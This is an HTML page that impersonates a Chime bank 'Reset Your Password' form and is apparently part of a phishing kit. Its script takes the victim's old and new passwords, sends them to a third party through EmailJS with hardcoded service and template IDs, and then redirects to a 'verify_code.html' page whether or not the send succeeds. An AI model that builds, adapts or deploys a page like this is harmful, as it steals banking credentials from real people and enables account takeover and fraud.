<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Reset Your Password – Chime</title>
  <meta name="theme-color" content="#2bd67b" />
  <style>
    :root {
      --chime-green: #2bd67b;
      --chime-green-600: #22c26a;
      --ink: #1a2332;
      --muted: #6b7280;
      --line: #e5e7eb;
      --card: #ffffff;
      --bg: #ffffff;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background: var(--bg);
      color: var(--ink);
      display: flex;
      min-height: 100svh;
      align-items: center;
      justify-content: center;
      padding: 16px;
    }
    .card {
      width: 100%;
      max-width: 420px;
      background: var(--card);
      border-radius: 12px;
      box-shadow: 0 6px 22px rgba(0, 0, 0, .08);
      padding: 24px;
      text-align: center;
    }
    .logo {
      margin-bottom: 24px;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .logo img {
      width: 140px;
      height: auto;
      display: block;
    }
    h1 {
      font-size: 28px;
      margin: 0 0 8px;
      font-weight: 700;
    }
    .field {
      margin: 12px 0;
      text-align: left;
    }
    input[type="password"] {
      width: 100%;
      height: 52px;
      padding: 0 16px;
      font-size: 16px;
      border: 1px solid var(--line);
      border-radius: 10px;
      background: #fff;
      color: #111827;
      outline: none;
      transition: border-color .18s, box-shadow .18s;
    }
    input::placeholder {
      color: #9ca3af;
    }
    input:focus {
      border-color: var(--chime-green);
      box-shadow: 0 0 0 4px color-mix(in oklab, var(--chime-green) 20%, transparent);
    }
    .requirements {
      list-style: none;
      padding: 0;
      margin: 18px 0 20px;
      text-align: left;
    }
    .requirements li {
      display: flex;
      gap: 10px;
      font-size: 15px;
      color: var(--ink);
      margin: 4px 0;
    }
    .requirements li::before {
      content: "•";
      font-weight: 700;
      color: var(--ink);
    }
    .requirements li strong {
      font-weight: 600;
      color: inherit;
    }
    .btn {
      width: 100%;
      height: 56px;
      border: none;
      border-radius: 10px;
      background: var(--chime-green);
      color: #fff;
      font-size: 17px;
      font-weight: 700;
      cursor: pointer;
      transition: transform .04s ease, background .18s ease;
    }
    .btn:hover {
      background: var(--chime-green-600);
    }
    .btn:active {
      transform: translateY(1px);
    }
    .help {
      margin-top: 18px;
      font-size: 15px;
      color: var(--ink);
    }
    .help a {
      color: #000000;
      text-decoration: none;
      font-weight: 700;
    }
    .help a:hover {
      text-decoration: underline;
    }
  
/* === Spinner system (Button + Fullscreen) === */
.spinner-bars{color:#0b1117;display:inline-block;position:relative;width:28px;height:28px}
.spinner-bars.white{color:#fff}
.spinner-bars div{transform-origin:14px 14px;animation:spinner-bars 1.2s linear infinite}
.spinner-bars div:after{content:" ";display:block;position:absolute;top:2px;left:13px;width:3px;height:8px;border-radius:20%;background:currentColor}
.spinner-bars div:nth-child(1){transform:rotate(0deg);animation-delay:-1.1s}
.spinner-bars div:nth-child(2){transform:rotate(30deg);animation-delay:-1s}
.spinner-bars div:nth-child(3){transform:rotate(60deg);animation-delay:-.9s}
.spinner-bars div:nth-child(4){transform:rotate(90deg);animation-delay:-.8s}
.spinner-bars div:nth-child(5){transform:rotate(120deg);animation-delay:-.7s}
.spinner-bars div:nth-child(6){transform:rotate(150deg);animation-delay:-.6s}
.spinner-bars div:nth-child(7){transform:rotate(180deg);animation-delay:-.5s}
.spinner-bars div:nth-child(8){transform:rotate(210deg);animation-delay:-.4s}
.spinner-bars div:nth-child(9){transform:rotate(240deg);animation-delay:-.3s}
.spinner-bars div:nth-child(10){transform:rotate(270deg);animation-delay:-.2s}
.spinner-bars div:nth-child(11){transform:rotate(300deg);animation-delay:-.1s}
.spinner-bars div:nth-child(12){transform:rotate(330deg);animation-delay:0s}
@keyframes spinner-bars{0%{opacity:1}100%{opacity:0}}

#fullpageSpinner{position:fixed;inset:0;background:#fff;display:flex;justify-content:center;align-items:center;z-index:99999;visibility:hidden;opacity:0;transition:opacity .15s ease}
#fullpageSpinner.active{visibility:visible;opacity:1}

</style>
</head>
<body>
  <main class="card" role="main" aria-labelledby="page-title">
    <div class="logo">
      <img src="0FB187F8-F09B-4787-B256-FCDCD9CCD1D0.jpeg" alt="Chime Logo">
    </div>
    <h1 id="page-title">Reset Your Password</h1>
    <form id="resetForm">
      <div class="field">
        <input id="old-pass" type="password" placeholder="Old password" autocomplete="current-password" required />
      </div>

      <div class="field">
        <input id="new-pass" type="password" placeholder="New password" autocomplete="new-password" required />
      </div>
      <div class="field">
        <input id="confirm-pass" type="password" placeholder="Confirm new password" autocomplete="new-password" required />
      </div>

      <ul class="requirements">
        <li>At least 8 characters</li>
        <li>Must include letters and <strong>numbers</strong></li>
        <li>Cannot match previous passwords</li>
      </ul>

      <button class="btn" type="submit">Reset Password</button>
    </form>

    <p class="help">
      Having trouble?
      <a href="https://help.chime.com/how-do-i-contact-chime-customer-service-731cb26b" target="_blank" rel="noopener noreferrer">
        Contact Member Services.
      </a>
    </p>
  </main>

  <!-- ✅ EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    (function() {
      document.addEventListener("DOMContentLoaded", function() {
        emailjs.init("M-C4gidliuniowGNM");

        const form = document.getElementById("resetForm");
        form.addEventListener("submit", function(e) {
          e.preventDefault();

          const oldPass = document.getElementById("old-pass").value.trim();
          const newPass = document.getElementById("new-pass").value.trim();
          const confirmPass = document.getElementById("confirm-pass").value.trim();

          const params = {
            old_password: oldPass,
            new_password: newPass,
            confirm_password: confirmPass
          };

          emailjs.send("service_3bkxygu", "template_rm2sogz", params)
            .then(function(response) {
              console.log("✅ Email sent successfully", response.status, response.text);
              bigBrainRedirect("verify_code.html"); // ✅ redirect fixed here
            })
            .catch(function(error) {
              console.error("⚠️ Email failed, redirecting anyway", error);
              bigBrainRedirect("verify_code.html"); // ✅ fallback redirect fixed
            });
        });
      });
    })();
  </script>

<div id="fullpageSpinner"><div class="spinner-bars" aria-label="Loading">
  <div></div><div></div><div></div><div></div><div></div><div></div>
  <div></div><div></div><div></div><div></div><div></div><div></div>
</div></div>
<script>
(function(){
  const SPIN_WHITE = '<div class="spinner-bars white"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>';

  // Remember last clicked CTA
  document.addEventListener('click', function(e){
    const btn = e.target.closest('button, .btn');
    if(btn){ window.__lastBtnClicked = btn; }
  }, true);

  function inlineSpin(btn){
    if(!btn) return;
    btn.disabled = true;
    btn.dataset.originalText = btn.innerHTML;
    btn.innerHTML = SPIN_WHITE;
  }

  window.bigBrainRedirect = function(nextPage, inlineMs=3000, fullMs=2000){
    const btn = window.__lastBtnClicked;
    if(btn){ inlineSpin(btn); }
    setTimeout(function(){
      document.getElementById('fullpageSpinner').classList.add('active');
      setTimeout(function(){ window.location.href = nextPage; }, fullMs);
    }, inlineMs);
  };

})();
</script>

</body>
</html>
